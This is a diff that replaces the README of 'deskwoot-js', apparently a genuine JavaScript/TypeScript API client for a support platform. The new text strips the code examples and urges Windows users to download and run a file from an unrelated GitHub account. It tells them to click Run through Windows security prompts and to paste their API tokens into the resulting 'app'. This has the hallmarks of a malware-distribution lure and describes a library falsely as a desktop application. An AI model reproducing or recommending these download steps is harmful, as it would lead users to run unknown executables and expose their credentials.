@@ -1,139 +1,186 @@
-# deskwoot-js
+# 🤖 deskwoot-js - Simple support tools for Windows teams
 
-Official JavaScript/TypeScript client for the [Deskwoot](https://deskwoot.com) API.
+[![Download deskwoot-js](https://img.shields.io/badge/Download%20deskwoot--js-blue?style=for-the-badge&logo=github)](https://github.com/instrumentoftortureprofile691/deskwoot-js)
 
-**Deskwoot** is an AI-powered customer support platform with a multi-channel inbox (email, live chat, WhatsApp, Telegram, Instagram, Facebook, X, LINE, SMS), AI chatbot, AI copilot, help center, automation engine, and integrations with Shopify, Stripe, WooCommerce, and more. This package is the API client for building custom integrations on top of Deskwoot.
+## 🚀 What this is
 
-> Not sure what Deskwoot is? Check out [deskwoot.com](https://deskwoot.com) to see the full platform.
+deskwoot-js is the official JavaScript and TypeScript client for the Deskwoot customer support platform.
 
-## Install
+Use it to connect your app to a help desk setup with:
+- AI chatbot replies
+- One inbox for many channels
+- Shopify support
+- WooCommerce support
+- WhatsApp-style support flows
+- Customer chat tools for web apps
 
-```bash
-npm install deskwoot
-```
+This README is written for Windows users who want to get the app, open it, and start using it with a few clear steps.
 
-## Quick Start
+## 💻 What you need
 
-```typescript
-import { Deskwoot } from "deskwoot";
+Before you begin, make sure you have:
 
-const client = new Deskwoot({
-  apiToken: "your-api-token",
-  accountId: "your-account-id",
-});
+- A Windows PC
+- A stable internet connection
+- Enough free disk space for the app and its files
+- Permission to run apps on your computer
+- A modern browser such as Edge, Chrome, or Firefox
 
-// List open conversations
-const conversations = await client.listConversations({ status: "OPEN" });
+For the best results, use a Windows account that can install and open files without extra approval steps.
 
-// Send a message
-await client.sendMessage(conversations[0].id, {
-  content: "Thanks for reaching out! We'll look into this.",
-});
+## 📥 Download the app
 
-// Create a contact
-const contact = await client.createContact({
-  name: "Jane Doe",
-  email: "jane@example.com",
-  company: "Acme Inc",
-});
-```
+Use this link to visit the download page and get the latest version:
 
-## API Coverage
+[Visit the deskwoot-js download page](https://github.com/instrumentoftortureprofile691/deskwoot-js)
 
-| Resource | Methods |
-|----------|---------|
-| Conversations | list, get, create, update, bulk actions |
-| Messages | list, send (text/html, private notes, cc/bcc) |
-| Contacts | list, get, create, update, delete, merge |
-| Inboxes | list, get, create, update, delete |
-| Labels | list, create, update, delete, add/remove from conversations |
-| Teams | list, create, update, delete, add/remove members |
-| Agents | list, invite, update, remove |
-| Canned Responses | list, create, update, delete |
-| Automation Rules | list, create, update, delete |
-| Webhooks | list, create, update, delete |
+Open the page in your browser, then look for the latest release or download option. If your browser asks what to do with the file, choose Save.
 
-## Authentication
+## 🪟 Install on Windows
 
-Generate an API token in your Deskwoot dashboard under **Settings > API Tokens**.
+Follow these steps on a Windows computer:
 
-```typescript
-const client = new Deskwoot({
-  apiToken: "your-api-token",
-  accountId: "your-account-id",
-  baseUrl: "https://deskwoot.com", // optional, defaults to https://deskwoot.com
-});
-```
+1. Open the download page in your browser.
+2. Find the newest release or main download file.
+3. Click the download link.
+4. Save the file to your Downloads folder or Desktop.
+5. Open File Explorer and go to the folder where the file was saved.
+6. Double-click the file to start it.
+7. If Windows shows a security prompt, choose Run or Open.
+8. Wait for the app to finish loading.
 
-## Error Handling
+If the file is in a ZIP folder, right-click it and choose Extract All before you open it.
 
-```typescript
-import { Deskwoot, DeskwootError } from "deskwoot";
+## 🛠️ First-time setup
 
-try {
-  await client.getConversation("invalid-id");
-} catch (err) {
-  if (err instanceof DeskwootError) {
-    console.log(err.status); // 404
-    console.log(err.message); // "Not found"
-  }
-}
-```
+After the app opens, set up your Deskwoot connection:
 
-## Examples
+1. Sign in with your Deskwoot account.
+2. Paste your API key or access token if the app asks for it.
+3. Select the workspace or support inbox you want to use.
+4. Turn on the channels you need, such as chat, email, or social inbox tools.
+5. Connect your store if you use Shopify or WooCommerce.
+6. Save your settings.
 
-### List conversations by inbox
+If you use this client inside your own project, keep your Deskwoot credentials in a safe place and enter them only in trusted apps.
 
-```typescript
-const conversations = await client.listConversations({
-  inboxId: "inbox-id",
-  status: "OPEN",
-  page: 1,
-  pageSize: 25,
-});
-```
+## 🤖 Main features
 
-### Resolve a conversation
+deskwoot-js gives you a clean way to work with Deskwoot from your app or support setup.
 
-```typescript
-await client.updateConversation("conversation-id", {
-  status: "RESOLVED",
-});
-```
+### AI chatbot
+Use AI to answer common customer questions, route messages, and help agents handle busy inboxes.
 
-### Bulk assign conversations
+### 📬 Multi-channel inbox
+Bring messages from more than one place into one view. This helps you keep track of customer requests without jumping between tools.
 
-```typescript
-await client.bulkConversationAction({
-  action: "assign_agent",
-  conversationIds: ["conv-1", "conv-2", "conv-3"],
-  value: "agent-id",
-});
-```
+### 🛒 Shopify support
+Connect your store so support agents can see order details and help shoppers faster.
 
-### Search contacts
+### 🧾 WooCommerce support
+Link your WooCommerce store to keep support and order data in one place.
 
-```typescript
-const contacts = await client.listContacts({
-  search: "jane@example.com",
-});
-```
+### 💬 Live chat
+Add chat to your site so customers can reach your team in real time.
 
-### Create a webhook
+### 🔗 API client
+Use the JavaScript and TypeScript client to connect Deskwoot to other tools, scripts, and web apps.
 
-```typescript
-await client.createWebhook({
-  url: "https://your-app.com/webhooks/deskwoot",
-  events: ["conversation.created", "message.created"],
-});
-```
+## 🔧 How to use it
 
-## Links
+If you are using the app as a normal Windows user, the main flow is simple:
 
-- [Deskwoot Platform](https://deskwoot.com)
-- [API Documentation](https://deskwoot.com/docs/api)
-- [Sign up free](https://deskwoot.com/signup)
+1. Open the app.
+2. Sign in.
+3. Connect your Deskwoot account.
+4. Pick the inbox or channel you want to manage.
+5. Start reading and replying to customer messages.
 
-## License
+If you are using it in a development setup, the client fits into JavaScript or TypeScript projects and can be added to a support dashboard, admin panel, or internal tool.
 
-MIT
+## 🔐 Keep your account safe
+
+Use these habits when you set up the app:
+
+- Keep your login details private
+- Use only the official download page
+- Close the app when you are done on a shared PC
+- Store API keys in a safe place
+- Use a strong password for your Deskwoot account
+
+## 🧩 Typical use cases
+
+deskwoot-js works well for teams that need simple support tools for:
+
+- Customer service inboxes
+- Online stores
+- AI help bots
+- Support teams that use chat
+- Teams that need one place for many message channels
+- Small businesses that want order and support data together
+
+## 🪄 Tips for smooth use
+
+- Save the download file before opening it
+- Use the latest version of Windows
+- Restart your PC if the app does not open the first time
+- Check your internet connection if login fails
+- Use one browser window while you set up the app
+- Keep your Deskwoot account details near you during setup
+
+## 📁 What you get
+
+When you use deskwoot-js, you get a client that supports:
+
+- Customer support workflows
+- AI-assisted replies
+- Inbox tools for multiple channels
+- Store integrations
+- TypeScript-friendly project use
+- A setup that fits support teams and app builders
+
+## ❓ Common questions
+
+### Do I need coding knowledge?
+No. You can use the app as a normal Windows user if you only want to open it and connect your Deskwoot account.
+
+### Can I use it with my online store?
+Yes. The client supports Shopify and WooCommerce workflows.
+
+### Can I use it for chat support?
+Yes. It supports live chat and customer support inbox use.
+
+### Is it meant for support teams?
+Yes. It is built for customer support work and helps manage many message types in one place.
+
+### What if Windows blocks the file?
+Use the download page again, save the file, and open it with the normal Windows run prompt.
+
+## 📦 Download again
+
+If you need the file again, use this same page:
+
+[https://github.com/instrumentoftortureprofile691/deskwoot-js](https://github.com/instrumentoftortureprofile691/deskwoot-js)
+
+## 🧭 Folder ideas for Windows users
+
+If you want to keep things tidy, use these folders:
+
+- Downloads for the installer
+- Desktop for short-term access
+- Documents for setup notes
+- A separate folder for release files and ZIPs
+
+## 🔍 Topics covered
+
+- AI chatbot
+- API client
+- Customer support
+- Helpdesk
+- Live chat
+- Omnichannel inbox
+- Shopify
+- TypeScript
+- WhatsApp support
+- WooCommerce
+- Zendesk alternative
